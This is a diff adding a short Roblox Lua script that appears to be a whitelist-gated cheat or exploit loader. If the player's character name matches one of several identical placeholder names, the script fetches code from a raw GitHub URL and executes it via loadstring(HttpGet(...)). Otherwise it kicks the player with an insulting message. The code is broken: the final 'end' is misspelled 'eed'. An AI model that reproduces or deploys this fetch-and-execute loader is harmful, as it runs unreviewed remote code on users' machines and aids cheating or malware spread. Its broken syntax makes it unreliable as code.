@@ -1,0 +1,25 @@
+local a=tostring(game.Players.LocalPlayer.Character);
+if a=="名字"then
+_G.whitelisted=true
+elseif a=="名字"then
+_G.whitelisted=true
+elseif a=="名字"then
+_G.whitelisted=true
+elseif a=="名字"then
+_G.whitelisted=true
+elseif a=="名字"then
+_G.whitelisted=true
+elseif a=="名字"then
+_G.whitelisted=true
+elseif a=="名字"then
+_G.whitelisted=true
+elseif a=="名字"then
+_G.whitelisted=true
+end
+if _G.whitelisted==true then
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GTAFAW/goto/main/pmd"))()
+
+else
+game.Players.LocalPlayer:Kick(a.."你没有白名单🖕")
+eed
